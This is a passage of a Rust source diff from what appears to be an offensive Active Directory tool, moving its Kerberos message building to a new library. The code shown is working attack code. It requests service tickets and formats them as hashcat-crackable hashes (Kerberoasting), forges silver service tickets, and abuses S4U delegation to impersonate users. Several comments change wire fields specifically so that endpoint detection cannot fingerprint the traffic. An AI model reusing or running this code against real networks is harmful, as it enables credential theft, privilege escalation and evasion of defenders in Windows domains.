+        Err(_) => CredResult::Malformed,
     })
 }
 
 /// Build a TGS-REQ for `spn` using the TGT, and return the crackable service-ticket hash.
+///
+/// 1.5.3 kerbcore swap: the TGS-REQ (authenticator sealed under the TGT session key, PA-TGS-REQ
+/// AP-REQ, request body) is assembled by [`kerbcore::client::build_tgs_req`] and the TGS-REP is
+/// parsed by [`kerbcore::messages::KdcRep`]. The picky `Tgt` fields are bridged into kerbcore
+/// types via a lossless DER round-trip (removed when `Tgt` flips to kerbcore at K9).
 pub async fn roast_spn(tgt: &Tgt, sam: &str, spn: &str, kdc: &str) -> Result<String> {
-    // Authenticator, encrypted under the TGT session key (usage 7).
-    let authenticator = Authenticator::from(AuthenticatorInner {
-        authenticator_bno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
-        crealm: ExplicitContextTag1::from(krb_string(&tgt.crealm)?),
-        cname: ExplicitContextTag2::from(tgt.cname.clone()),
-        cksum: Optional::from(None),
-        cusec: ExplicitContextTag4::from(IntegerAsn1(vec![0])),
-        ctime: ExplicitContextTag5::from(now_kerberos_time()),
-        subkey: Optional::from(None),
-        seq_number: Optional::from(None),
-        authorization_data: Optional::from(None),
-    });
-    let auth_der =
-        picky_asn1_der::to_vec(&authenticator).map_err(|e| anyhow!("encode authenticator: {e}"))?;
-    let enc_auth = enc_session(
-        &tgt.session_key,
-        TGS_REQ_PA_DATA_AP_REQ_AUTHENTICATOR,
-        &auth_der,
-    )?;
-
-    // AP-REQ carrying the TGT + encrypted authenticator.
-    let ap_req = ApReq::from(ApReqInner {
-        pvno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
-        msg_type: ExplicitContextTag1::from(IntegerAsn1(vec![AP_REQ_MSG_TYPE])),
-        ap_options: ExplicitContextTag2::from(BitStringAsn1::from(BitString::with_bytes(vec![
-            0, 0, 0, 0,
-        ]))),
-        ticket: ExplicitContextTag3::from(tgt.ticket.clone()),
-        authenticator: ExplicitContextTag4::from(encrypted_data(
-            session_etype(&tgt.session_key),
-            enc_auth,
-        )),
-    });
-    let ap_der = picky_asn1_der::to_vec(&ap_req).map_err(|e| anyhow!("encode AP-REQ: {e}"))?;
-    let pa_tgs = PaData {
-        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![0x01])), // PA-TGS-REQ
-        padata_data: ExplicitContextTag2::from(OctetStringAsn1(ap_der)),
-    };
+    let kc_ticket = kerbcore::messages::Ticket::decode(&picky_asn1_der::to_vec(&tgt.ticket)?)
+        .map_err(|e| anyhow!("bridge picky->kerbcore Ticket: {e:?}"))?;
+    // 1.5.3 audit H-1: use the tracked session_etype from the AS-REP (no length-heuristic).
+    let sk = kc_session_key_of(tgt)?;
+    let cname_kc = kerbcore::types::PrincipalName::decode(&picky_asn1_der::to_vec(&tgt.cname)?)
+        .map_err(|e| anyhow!("bridge picky->kerbcore cname: {e:?}"))?;
 
     // SPN → sname (split service class / instance on '/').
-    let parts: Vec<&str> = spn.split('/').collect();
-    let sname = principal(NT_SRV_INST, &parts)?;
-
-    let body = KdcReqBody {
-        kdc_options: ExplicitContextTag0::from(kdc_options()),
-        cname: Optional::from(None), // identity comes from the ticket
-        realm: ExplicitContextTag2::from(krb_string(&tgt.crealm)?),
-        sname: Optional::from(Some(ExplicitContextTag3::from(sname))),
-        from: Optional::from(None),
-        till: ExplicitContextTag5::from(crate::far_future_time()),
-        rtime: Optional::from(None),
-        nonce: ExplicitContextTag7::from(nonce()),
-        // Offer RC4 (hashcat 13100) first, then AES256 (19700) — so AES-only service accounts
-        // (hardened / Server 2025 defaults) still return a ticket instead of KDC_ERR_ETYPE_NOSUPP.
-        etype: ExplicitContextTag8::from(Asn1SequenceOf::from(vec![
-            IntegerAsn1(vec![ETYPE_RC4_HMAC]),
-            IntegerAsn1(vec![crate::ETYPE_AES256]),
-        ])),
-        addresses: Optional::from(None),
-        enc_authorization_data: Optional::from(None),
-        additional_tickets: Optional::from(None),
+    let sname = kerbcore::types::PrincipalName {
+        name_type: kerbcore::client::NT_SRV_INST,
+        name_string: spn.split('/').map(|s| s.to_string()).collect(),
     };
-    let tgs_req = TgsReq::from(KdcReq {
-        pvno: ExplicitContextTag1::from(IntegerAsn1(vec![5])),
-        msg_type: ExplicitContextTag2::from(IntegerAsn1(vec![TGS_REQ_MSG_TYPE])),
-        padata: Optional::from(Some(ExplicitContextTag3::from(Asn1SequenceOf::from(vec![
-            pa_tgs,
-        ])))),
-        req_body: ExplicitContextTag4::from(body),
-    });
 
-    let raw = picky_asn1_der::to_vec(&tgs_req).map_err(|e| anyhow!("encode TGS-REQ: {e}"))?;
+    // Offer RC4 (hashcat 13100) first, then AES256 (19700) — so AES-only service accounts
+    // (hardened / Server 2025 defaults) still return a ticket instead of KDC_ERR_ETYPE_NOSUPP.
+    let raw = kerbcore::client::build_tgs_req(
+        &tgt.crealm,
+        &sname,
+        &kc_ticket,
+        &sk,
+        &tgt.crealm,
+        &cname_kc,
+        nonce_u32(),
+        FAR_FUTURE,
+        &[ETYPE_RC4_HMAC as i32, crate::ETYPE_AES256 as i32],
+        &now_krb_str(),
+        0,
+    )
+    .map_err(|e| anyhow!("build TGS-REQ: {e}"))?;
     let resp = kdc_exchange(kdc, &raw).await?;
-    let tgs_rep: TgsRep =
-        picky_asn1_der::from_bytes(&resp).map_err(|_| anyhow!("TGS-REP: {}", krb_err(&resp)))?;
+    let tgs_rep = kerbcore::messages::KdcRep::decode(&resp)
+        .map_err(|_| anyhow!("TGS-REP: {}", krb_err(&resp)))?;
 
     // The crackable material is the *service ticket* enc-part.
-    let tkt_enc = &tgs_rep.0.ticket.0 .0.enc_part.0;
-    let etype = tkt_enc
-        .etype
-        .0
-         .0
-        .iter()
-        .fold(0u32, |a, &b| (a << 8) | b as u32);
-    let cipher = &tkt_enc.cipher.0 .0;
+    let tkt_enc = &tgs_rep.ticket.enc_part;
     // RC4 (23) → hashcat 13100; AES128/256 (17/18) → hashcat 19600/19700.
-    Ok(if etype == ETYPE_RC4_HMAC as u32 {
-        format_tgs(sam, &tgt.crealm, spn, cipher)
+    Ok(if tkt_enc.etype == ETYPE_RC4_HMAC as i32 {
+        format_tgs(sam, &tgt.crealm, spn, &tkt_enc.cipher)
     } else {
-        crate::format_tgs_aes(sam, &tgt.crealm, spn, etype as u8, cipher)
+        crate::format_tgs_aes(sam, &tgt.crealm, spn, tkt_enc.etype as u8, &tkt_enc.cipher)
     })
 }
 
@@ -648,6 +750,10 @@ pub async fn roast_spn(tgt: &Tgt, sam: &str, spn: &str, kdc: &str) -> Result<Str
 pub struct ServiceTicket {
     pub ticket: Ticket,
     pub session_key: Vec<u8>,
+    /// The service-ticket session key's Kerberos enctype (RFC 3961 number), tracked from the
+    /// TGS-REP reply key type. 1.5.3 audit H-1 — replaces the length-heuristic that misidentified
+    /// AES128 (16-byte) session keys as RC4.
+    pub session_etype: i32,
     pub crealm: String,
     pub cname: PrincipalName,
     pub spn: Vec<String>,
@@ -659,6 +765,7 @@ impl std::fmt::Debug for ServiceTicket {
             .field("crealm", &self.crealm)
             .field("cname", &self.cname)
             .field("spn", &self.spn)
+            .field("session_etype", &self.session_etype)
             .field("session_key", &"***")
             .field("ticket", &"***")
             .finish()
@@ -669,65 +776,70 @@ impl std::fmt::Debug for ServiceTicket {
 /// decrypt the reply enc-part with the TGT session key (usage 8) to recover the new service
 /// session key. The returned [`ServiceTicket`] drives a Kerberos SMB/LDAP AP-REQ.
 pub async fn get_service_ticket(tgt: &Tgt, spn: &str, kdc: &str) -> Result<ServiceTicket> {
-    use picky_krb::constants::key_usages::TGS_REP_ENC_SESSION_KEY;
-    use picky_krb::messages::{EncAsRepPart, EncTgsRepPart};
-
     tracing::debug!(
-        spn, kdc, crealm = %tgt.crealm, etypes = "AES256+RC4",
+        spn, kdc, crealm = %tgt.crealm, etypes = "AES256+RC4 (kerbcore)",
         "get_service_ticket: TGS-REQ start"
     );
 
     let comps: Vec<&str> = spn.split('/').collect();
-    let req = build_tgs_req(
+    let kc_ticket = kc_ticket_of(tgt)?;
+    // 1.5.3 audit H-1: tracked etype from the AS-REP session key (no length-heuristic).
+    let sk = kc_session_key_of(tgt)?;
+    let cname_kc = kc_cname_of(tgt)?;
+    let sname = kerbcore::types::PrincipalName {
+        name_type: kerbcore::client::NT_SRV_INST,
+        name_string: comps.iter().map(|s| s.to_string()).collect(),
+    };
+
+    // Offer RC4 as well as AES256: a TGT from overpass-the-hash (NT hash) carries an RC4 session
+    // key; the reply session key is decrypted by the typed KerberosKey either way, and SMB signing
+    // uses a fresh subkey regardless, so the service-session etype does not matter downstream.
+    let raw = kerbcore::client::build_tgs_req(
         &tgt.crealm,
-        principal(NT_SRV_INST, &comps)?,
-        vec![ap_req_padata(tgt)?],
-        [0x40, 0x81, 0x00, 0x00], // forwardable | renewable | canonicalize
-        vec![],
-        // Offer RC4 as well as AES256: a TGT from overpass-the-hash (NT hash → pass-the-ticket)
-        // has an RC4 session key, and an AES256-only request can draw KDC_ERR_ETYPE_NOSUPP. The
-        // reply session key is decrypted by dec_session(), which handles both; SMB signing uses a
-        // fresh AES128 subkey regardless, so the service-session etype does not matter downstream.
-        &[crate::ETYPE_AES256, ETYPE_RC4_HMAC],
-    )?;
-    let raw = picky_asn1_der::to_vec(&req).map_err(|e| anyhow!("TGS-REQ encode: {e}"))?;
+        &sname,
+        &kc_ticket,
+        &sk,
+        &tgt.crealm,
+        &cname_kc,
+        nonce_u32(),
+        FAR_FUTURE,
+        &[crate::ETYPE_AES256 as i32, ETYPE_RC4_HMAC as i32],
+        &now_krb_str(),
+        0,
+    )
+    .map_err(|e| anyhow!("build TGS-REQ: {e}"))?;
     tracing::trace!(bytes = raw.len(), spn, "TGS-REQ sent");
     let resp = kdc_exchange(kdc, &raw).await?;
     tracing::trace!(bytes = resp.len(), "TGS-REP response");
-    let tgs_rep: TgsRep = picky_asn1_der::from_bytes(&resp).map_err(|_| {
+    let tgs_rep = kerbcore::messages::KdcRep::decode(&resp).map_err(|_| {
         let err_str = krb_err(&resp);
         tracing::warn!(spn, "TGS-REP: {err_str}");
         anyhow!("TGS-REP: {err_str}")
     })?;
 
-    // Reply enc-part is sealed under the TGT session key (usage 8). Windows tags it as either
-    // EncTGSRepPart (26) or EncASRepPart (25) — accept both.
-    let enc = &tgs_rep.0.enc_part.0.cipher.0 .0;
-    let plain = dec_session(&tgt.session_key, TGS_REP_ENC_SESSION_KEY, enc)?;
-    let kdc_rep = picky_asn1_der::from_bytes::<EncTgsRepPart>(&plain)
-        .map(|p| p.0)
-        .or_else(|_| picky_asn1_der::from_bytes::<EncAsRepPart>(&plain).map(|p| p.0))
-        .map_err(|e| anyhow!("decode EncKDCRepPart: {e}"))?;
-    let session_key = kdc_rep.key.0.key_value.0 .0.clone();
+    // Reply enc-part is sealed under the TGT session key (usage 8); kerbcore's
+    // parse_enc_kdc_rep_part accepts both EncTGSRepPart (APP 26) and EncASRepPart (APP 25).
+    let plain = sk
+        .decrypt(
+            kerbcore::client::KU_TGS_REP_ENC_PART,
+            &tgs_rep.enc_part.cipher,
+        )
+        .map_err(|e| anyhow!("decrypt TGS-REP enc-part: {e}"))?;
+    let part = kerbcore::client::parse_enc_kdc_rep_part(&plain)
+        .map_err(|e| anyhow!("decode EncKDCRepPart: {e:?}"))?;
+    let session_key = part.key.keyvalue;
     tracing::debug!(
         spn,
         session_key_len = session_key.len(),
-        rep_etype = tgs_rep
-            .0
-            .enc_part
-            .0
-            .etype
-            .0
-             .0
-            .first()
-            .copied()
-            .unwrap_or(0),
-        "Service ticket acquired"
+        rep_etype = tgs_rep.enc_part.etype,
+        "Service ticket acquired (kerbcore)"
     );
 
     Ok(ServiceTicket {
-        ticket: tgs_rep.0.ticket.0.clone(),
+        ticket: picky_ticket(&tgs_rep.ticket)?,
         session_key,
+        // 1.5.3 audit H-1: track the actual service-session-key etype from EncKDCRepPart.key.keytype.
+        session_etype: part.key.keytype,
         crealm: tgt.crealm.clone(),
         cname: tgt.cname.clone(),
         spn: comps.iter().map(|s| s.to_string()).collect(),
@@ -740,6 +852,8 @@ pub fn silver_service_ticket(tgt: &Tgt, spn: &str) -> ServiceTicket {
     ServiceTicket {
         ticket: tgt.ticket.clone(),
         session_key: tgt.session_key.clone(),
+        // Silver = forged service ticket; its session-key etype matches the forged TGT wrapper.
+        session_etype: tgt.session_etype,
         crealm: tgt.crealm.clone(),
         cname: tgt.cname.clone(),
         spn: spn.split('/').map(|s| s.to_string()).collect(),
@@ -750,56 +864,59 @@ pub fn silver_service_ticket(tgt: &Tgt, spn: &str) -> ServiceTicket {
 /// it together with the 16-byte SMB session key. The authenticator carries a random AES128 subkey
 /// (etype 17) which becomes the GSS/SMB session key, so SMB signing is deterministic on our side.
 pub fn build_ap_req_gss(st: &ServiceTicket) -> Result<(Vec<u8>, [u8; 16])> {
-    // Random 16-byte subkey → the SMB session key.
+    // Random 16-byte AES128 subkey → the SMB session key.
     let mut subkey = [0u8; 16];
     rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut subkey);
+    let subkey_ek = kerbcore::types::EncryptionKey {
+        keytype: 17,
+        keyvalue: subkey.to_vec(),
+    };
+    let ap_der = build_gss_ap_req(st, &subkey_ek)?;
+    Ok((crate::gss::spnego_krb5_init(&ap_der), subkey))
+}
 
-    // GSS 0x8003 checksum: Lgth(=16) + Bnd(16 zero) + Flags. Flags = INTEG|CONF|SEQUENCE|REPLAY
-    // (0x3c) — deliberately NOT MUTUAL (0x02), so the server completes in one leg with our subkey
-    // as the session key (no AP-REP acceptor subkey).
+/// Shared GSS AP-REQ builder (1.5.3 kerbcore swap). Builds the authenticator with the GSS 0x8003
+/// channel-binding checksum + the caller's subkey, sealed under the ticket session key (usage 11),
+/// via [`kerbcore::client::build_ap_req_with_confounder`]. ap-options = 0 (mutual-required OFF),
+/// so the server completes in one leg with our subkey as the session key. Returns the raw AP-REQ
+/// DER; the caller wraps it (SPNEGO for SMB, raw GSS for DCE-RPC).
+fn build_gss_ap_req(
+    st: &ServiceTicket,
+    subkey: &kerbcore::types::EncryptionKey,
+) -> Result<Vec<u8>> {
+    // GSS 0x8003 checksum: Lgth(=16) + Bnd(16 zero) + Flags = INTEG|CONF|SEQUENCE|REPLAY (0x3c).
     let mut gss_cksum = Vec::new();
     gss_cksum.extend_from_slice(&16u32.to_le_bytes());
     gss_cksum.extend_from_slice(&[0u8; 16]);
     gss_cksum.extend_from_slice(&0x0000_003cu32.to_le_bytes());
+    let cksum = kerbcore::types::Checksum {
+        cksumtype: 0x8003,
+        checksum: gss_cksum,
+    };
 
-    let authenticator = Authenticator::from(AuthenticatorInner {
-        authenticator_bno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
-        crealm: ExplicitContextTag1::from(krb_string(&st.crealm)?),
-        cname: ExplicitContextTag2::from(st.cname.clone()),
-        cksum: Optional::from(Some(ExplicitContextTag3::from(Checksum {
-            cksumtype: ExplicitContextTag0::from(IntegerAsn1(vec![0x00, 0x80, 0x03])), // 0x8003
-            checksum: ExplicitContextTag1::from(OctetStringAsn1(gss_cksum)),
-        }))),
-        cusec: ExplicitContextTag4::from(IntegerAsn1(vec![0])),
-        ctime: ExplicitContextTag5::from(now_kerberos_time()),
-        subkey: Optional::from(Some(ExplicitContextTag6::from(EncryptionKey {
-            key_type: ExplicitContextTag0::from(IntegerAsn1(vec![17])), // AES128
-            key_value: ExplicitContextTag1::from(OctetStringAsn1(subkey.to_vec())),
-        }))),
-        seq_number: Optional::from(None),
-        authorization_data: Optional::from(None),
-    });
-    let auth_der =
-        picky_asn1_der::to_vec(&authenticator).map_err(|e| anyhow!("authenticator: {e}"))?;
-    // Authenticator sealed under the *ticket session key* (usage 11) — RC4 or AES per its etype.
-    let enc_auth = enc_session(&st.session_key, 11, &auth_der)?;
+    let kc_ticket = kerbcore::messages::Ticket::decode(&picky_asn1_der::to_vec(&st.ticket)?)
+        .map_err(|e| anyhow!("bridge picky->kerbcore Ticket: {e:?}"))?;
+    // 1.5.3 audit H-1: use tracked ServiceTicket.session_etype (no length-heuristic).
+    let sk = kc_service_key_of(st)?;
+    let cname_kc = kerbcore::types::PrincipalName::decode(&picky_asn1_der::to_vec(&st.cname)?)
+        .map_err(|e| anyhow!("bridge picky->kerbcore cname: {e:?}"))?;
 
-    let ap_req = ApReq::from(ApReqInner {
-        pvno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
-        msg_type: ExplicitContextTag1::from(IntegerAsn1(vec![AP_REQ_MSG_TYPE])),
-        // ap-options: bit 1 (0x40000000) = mutual-required OFF; send 0 so the session key stays
-        // our subkey (no acceptor subkey in an AP-REP).
-        ap_options: ExplicitContextTag2::from(BitStringAsn1::from(BitString::with_bytes(vec![
-            0, 0, 0, 0,
-        ]))),
-        ticket: ExplicitContextTag3::from(st.ticket.clone()),
-        authenticator: ExplicitContextTag4::from(encrypted_data(
-            session_etype(&st.session_key),
-            enc_auth,
-        )),
-    });
-    let ap_der = picky_asn1_der::to_vec(&ap_req).map_err(|e| anyhow!("AP-REQ: {e}"))?;
-    Ok((crate::gss::spnego_krb5_init(&ap_der), subkey))
+    let mut conf = vec![0u8; sk.enctype().confounder_len()];
+    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut conf);
+
+    Ok(kerbcore::client::build_ap_req_with_confounder(
+        &kc_ticket,
+        &sk,
+        &st.crealm,
+        &cname_kc,
+        &now_krb_str(),
+        0,
+        0, // ap-options: mutual-required OFF
+        Some(&cksum),
+        Some(subkey),
+        None,
+        &conf,
+    ))
 }
 
 /// AES256 variant of [`build_ap_req_gss`] — generates a 32-byte AES256 subkey (etype 18)
@@ -811,51 +928,15 @@ pub fn build_ap_req_gss(st: &ServiceTicket) -> Result<(Vec<u8>, [u8; 16])> {
 /// wrap the returned raw bytes via `crate::gss::spnego_krb5_init(ap_req_der)` — passing
 /// the raw AP-REQ DER, not this function's output.
 pub fn build_ap_req_gss_aes256(st: &ServiceTicket) -> Result<(Vec<u8>, [u8; 32])> {
+    // Random 32-byte AES256 subkey; same GSS 0x8003 authenticator as the AES128 path — only the
+    // subkey etype/size and the outer wrap (raw GSS, not SPNEGO) differ.
     let mut subkey = [0u8; 32];
     rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut subkey);
-
-    // Same GSS 0x8003 checksum as the AES128 path — only the subkey etype/size changes.
-    let mut gss_cksum = Vec::new();
-    gss_cksum.extend_from_slice(&16u32.to_le_bytes());
-    gss_cksum.extend_from_slice(&[0u8; 16]);
-    gss_cksum.extend_from_slice(&0x0000_003cu32.to_le_bytes());
-
-    let authenticator = Authenticator::from(AuthenticatorInner {
-        authenticator_bno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
-        crealm: ExplicitContextTag1::from(krb_string(&st.crealm)?),
-        cname: ExplicitContextTag2::from(st.cname.clone()),
-        cksum: Optional::from(Some(ExplicitContextTag3::from(Checksum {
-            cksumtype: ExplicitContextTag0::from(IntegerAsn1(vec![0x00, 0x80, 0x03])),
-            checksum: ExplicitContextTag1::from(OctetStringAsn1(gss_cksum)),
-        }))),
-        cusec: ExplicitContextTag4::from(IntegerAsn1(vec![0])),
-        ctime: ExplicitContextTag5::from(now_kerberos_time()),
-        subkey: Optional::from(Some(ExplicitContextTag6::from(EncryptionKey {
-            key_type: ExplicitContextTag0::from(IntegerAsn1(vec![18])), // AES256
-            key_value: ExplicitContextTag1::from(OctetStringAsn1(subkey.to_vec())),
-        }))),
-        seq_number: Optional::from(None),
-        authorization_data: Optional::from(None),
-    });
-    let auth_der =
-        picky_asn1_der::to_vec(&authenticator).map_err(|e| anyhow!("authenticator: {e}"))?;
-    // Ticket-session-key encrypts the authenticator (usage 11). session_etype picks the
-    // right cipher for the ticket key size — matches how build_ap_req_gss does it.
-    let enc_auth = enc_session(&st.session_key, 11, &auth_der)?;
-
-    let ap_req = ApReq::from(ApReqInner {
-        pvno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
-        msg_type: ExplicitContextTag1::from(IntegerAsn1(vec![AP_REQ_MSG_TYPE])),
-        ap_options: ExplicitContextTag2::from(BitStringAsn1::from(BitString::with_bytes(vec![
-            0, 0, 0, 0,
-        ]))),
-        ticket: ExplicitContextTag3::from(st.ticket.clone()),
-        authenticator: ExplicitContextTag4::from(encrypted_data(
-            session_etype(&st.session_key),
-            enc_auth,
-        )),
-    });
-    let ap_der = picky_asn1_der::to_vec(&ap_req).map_err(|e| anyhow!("AP-REQ: {e}"))?;
+    let subkey_ek = kerbcore::types::EncryptionKey {
+        keytype: 18,
+        keyvalue: subkey.to_vec(),
+    };
+    let ap_der = build_gss_ap_req(st, &subkey_ek)?;
     Ok((crate::gss::gss_krb5_aprep(&ap_der), subkey))
 }
 
@@ -863,152 +944,127 @@ pub fn build_ap_req_gss_aes256(st: &ServiceTicket) -> Result<(Vec<u8>, [u8; 32])
 // S4U (MS-SFU): S4U2Self + S4U2Proxy — the RBCD / constrained-delegation abuse.
 // ---------------------------------------------------------------------------
 
-const PA_TGS_REQ: u8 = 0x01;
-const KERB_NON_KERB_CKSUM_SALT: i32 = 17;
-
-/// PA-FOR-USER (MS-SFU §2.2.1): identifies the user to impersonate, keyed to the TGT.
-#[derive(Serialize)]
-struct PaForUser {
-    user_name: ExplicitContextTag0<PrincipalName>,
-    user_realm: ExplicitContextTag1<GeneralStringAsn1>,
-    cksum: ExplicitContextTag2<Checksum>,
-    auth_package: ExplicitContextTag3<GeneralStringAsn1>,
-}
+// PA-DATA type numbers on the S4U/TGS path.
+const PA_TGS_REQ: i32 = 1;
+const PA_FOR_USER: i32 = 129;
+const PA_PAC_OPTIONS: i32 = 167;
+/// Key usage for the PA-FOR-USER "KERB-NON-KERB-CKSUM-SALT" checksum (MS-SFU §2.2.1).
+const KERB_NON_KERB_CKSUM_SALT: u32 = 17;
 
 /// Human-readable KDC error from a response that failed to parse as the expected reply.
 fn krb_err(resp: &[u8]) -> String {
-    match picky_asn1_der::from_bytes::<KrbError>(resp) {
-        Ok(err) => format!("KDC error {}", err.0.error_code.0),
-        Err(e) => format!("decode: {e}"),
+    match kerbcore::messages::KrbError::decode(resp) {
+        Ok(err) => format!("KDC error {}", err.error_code),
+        Err(e) => format!("decode: {e:?}"),
     }
 }
 
-/// The AP-REQ (authenticator under the TGT session key) wrapped as PA-TGS-REQ — the
-/// authentication padata every TGS-REQ carries.
-fn ap_req_padata(tgt: &Tgt) -> Result<PaData> {
-    let authenticator = Authenticator::from(AuthenticatorInner {
-        authenticator_bno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
-        crealm: ExplicitContextTag1::from(krb_string(&tgt.crealm)?),
-        cname: ExplicitContextTag2::from(tgt.cname.clone()),
-        cksum: Optional::from(None),
-        cusec: ExplicitContextTag4::from(IntegerAsn1(vec![0])),
-        ctime: ExplicitContextTag5::from(now_kerberos_time()),
-        subkey: Optional::from(None),
-        seq_number: Optional::from(None),
-        authorization_data: Optional::from(None),
-    });
-    let auth_der =
-        picky_asn1_der::to_vec(&authenticator).map_err(|e| anyhow!("authenticator: {e}"))?;
-    let enc_auth = enc_session(
-        &tgt.session_key,
-        TGS_REQ_PA_DATA_AP_REQ_AUTHENTICATOR,
-        &auth_der,
-    )?;
-    let ap_req = ApReq::from(ApReqInner {
-        pvno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
-        msg_type: ExplicitContextTag1::from(IntegerAsn1(vec![AP_REQ_MSG_TYPE])),
-        ap_options: ExplicitContextTag2::from(BitStringAsn1::from(BitString::with_bytes(vec![
-            0, 0, 0, 0,
-        ]))),
-        ticket: ExplicitContextTag3::from(tgt.ticket.clone()),
-        authenticator: ExplicitContextTag4::from(encrypted_data(
-            session_etype(&tgt.session_key),
-            enc_auth,
-        )),
-    });
-    let ap_der = picky_asn1_der::to_vec(&ap_req).map_err(|e| anyhow!("AP-REQ: {e}"))?;
-    Ok(PaData {
-        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![PA_TGS_REQ])),
-        padata_data: ExplicitContextTag2::from(OctetStringAsn1(ap_der)),
+/// The AP-REQ (authenticator under the TGT session key, usage 7) wrapped as PA-TGS-REQ — the
+/// authentication padata every TGS-REQ carries. 1.5.3 audit H-2: the authenticator now carries
+/// `[3] Checksum` over the KDC-REQ-BODY (usage 6, cksumtype from the session key's enctype), per
+/// RFC 4120 §3.3.2. Without it, AD tolerates the request but strict verifiers reject it and any
+/// EDR watching for the missing cksum has a wire fingerprint.
+fn ap_req_padata(tgt: &Tgt, body_der: &[u8]) -> Result<kerbcore::types::PaData> {
+    use kerbcore::der::{
+        application_tag, encode_integer, encode_sequence, explicit, tlv, TAG_BIT_STRING,
+    };
+    let sk = kc_session_key_of(tgt)?;
+    let cname_kc = kc_cname_of(tgt)?;
+    let kc_ticket = kc_ticket_of(tgt)?;
+    // Checksum over the KDC-REQ-BODY (usage 6). cksumtype comes from the session key's enctype
+    // (AES128=15, AES256=16, RC4=-138 per RFC 3961/4757). An unsupported enctype errors cleanly.
+    let cksumtype = sk.enctype().authenticator_cksumtype().ok_or_else(|| {
+        anyhow!(
+            "no authenticator checksum type for session-key enctype {}",
+            sk.enctype().to_i32()
+        )
+    })?;
+    let cksum = kerbcore::types::Checksum {
+        cksumtype,
+        checksum: sk.checksum(6, body_der),
+    };
+    // 1.5.3 audit L-4: random cusec (was cusec=0 — wire fingerprint). Bounded to 999_999.
+    let mut cusec_bytes = [0u8; 4];
+    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut cusec_bytes);
+    let cusec = (u32::from_be_bytes(cusec_bytes) % 1_000_000) as i64;
+    // Authenticator [APPLICATION 2] SEQUENCE { [0] vno=5, [1] crealm, [2] cname, [3] cksum,
+    // [4] cusec, [5] ctime }.
+    let auth_body = [
+        explicit(0, &encode_integer(5)),
+        explicit(1, &kerbcore::types::encode_realm(&tgt.crealm)),
+        explicit(2, &cname_kc.encode()),
+        explicit(3, &cksum.encode()),
+        explicit(4, &encode_integer(cusec)),
+        explicit(5, &kerbcore::types::KerberosTime(now_krb_str()).encode()),
+    ]
+    .concat();
+    let auth_der = tlv(application_tag(2), &encode_sequence(&auth_body));
+    let enc_auth = sk.encrypt(7, &auth_der); // usage 7 = TGS-REQ PA-DATA AP-REQ authenticator
+    let ed = kerbcore::types::EncryptedData {
+        etype: sk.enctype().to_i32(),
+        kvno: None,
+        cipher: enc_auth,
+    };
+    // AP-REQ [APPLICATION 14] SEQUENCE { [0] vno=5, [1] msg-type=14, [2] ap-options=0, [3] ticket, [4] authenticator }.
+    let ap_options = tlv(TAG_BIT_STRING, &[0u8, 0, 0, 0, 0]);
+    let ap_body = [
+        explicit(0, &encode_integer(5)),
+        explicit(1, &encode_integer(14)),
+        explicit(2, &ap_options),
+        explicit(3, &kc_ticket.encode()),
+        explicit(4, &ed.encode()),
+    ]
+    .concat();
+    let ap_der = tlv(application_tag(14), &encode_sequence(&ap_body));
+    Ok(kerbcore::types::PaData {
+        padata_type: PA_TGS_REQ,
+        padata_value: ap_der,
     })
 }
 
-/// Assemble a TGS-REQ with the given sname, padata, kdc-options and additional tickets.
-fn build_tgs_req(
-    realm: &str,
-    sname: PrincipalName,
-    padatas: Vec<PaData>,
-    options: [u8; 4],
-    additional: Vec<picky_krb::data_types::Ticket>,
-    etypes: &[u8],
-) -> Result<picky_krb::messages::TgsReq> {
-    let add = if additional.is_empty() {
-        Optional::from(None)
-    } else {
-        Optional::from(Some(ExplicitContextTag11::from(Asn1SequenceOf::from(
-            additional,
-        ))))
-    };
-    let body = KdcReqBody {
-        kdc_options: ExplicitContextTag0::from(BitStringAsn1::from(BitString::with_bytes(
-            options.to_vec(),
-        ))),
-        cname: Optional::from(None),
-        realm: ExplicitContextTag2::from(krb_string(realm)?),
-        sname: Optional::from(Some(ExplicitContextTag3::from(sname))),
-        from: Optional::from(None),
-        till: ExplicitContextTag5::from(crate::far_future_time()),
-        rtime: Optional::from(None),
-        nonce: ExplicitContextTag7::from(nonce()),
-        etype: ExplicitContextTag8::from(Asn1SequenceOf::from(
-            etypes
-                .iter()
-                .map(|e| IntegerAsn1(vec![*e]))
-                .collect::<Vec<_>>(),
-        )),
-        addresses: Optional::from(None),
-        enc_authorization_data: Optional::from(None),
-        additional_tickets: add,
-    };
-    Ok(TgsReq::from(KdcReq {
-        pvno: ExplicitContextTag1::from(IntegerAsn1(vec![5])),
-        msg_type: ExplicitContextTag2::from(IntegerAsn1(vec![TGS_REQ_MSG_TYPE])),
-        padata: Optional::from(Some(ExplicitContextTag3::from(Asn1SequenceOf::from(
-            padatas,
-        )))),
-        req_body: ExplicitContextTag4::from(body),
-    }))
-}
-
-fn pa_for_user(tgt: &Tgt, impersonate: &str) -> Result<PaData> {
-    // The PA-FOR-USER checksum (cksumtype 16) is HMAC-SHA1-96-AES256, so it is only valid over a
-    // 32-byte AES256 TGT session key. An RC4 (16-byte) session key would need cksumtype -138
-    // (HMAC-MD5) instead — fail loudly rather than send a checksum the KDC will silently reject.
-    // In practice get_tgt() always yields AES256 (or bails on ETYPE_NOSUPP), so this only guards a
-    // future RC4/NT-hash-driven caller: RBCD needs a controlled account that has an AES key.
-    if tgt.session_key.len() != 32 {
-        bail!(
-            "S4U2Self (PA-FOR-USER) needs an AES256 TGT session key, got {} bytes — RBCD/constrained \
-             delegation requires a controlled account with an AES key (password- or machine-account \
-             based), not an RC4-only/NT-hash TGT",
-            tgt.session_key.len()
-        );
-    }
-    // S4U checksum input: LE(name-type) || username || realm || auth-package.
+/// PA-FOR-USER (MS-SFU §2.2.1): the user to impersonate, keyed to the TGT session key.
+fn pa_for_user(tgt: &Tgt, impersonate: &str) -> Result<kerbcore::types::PaData> {
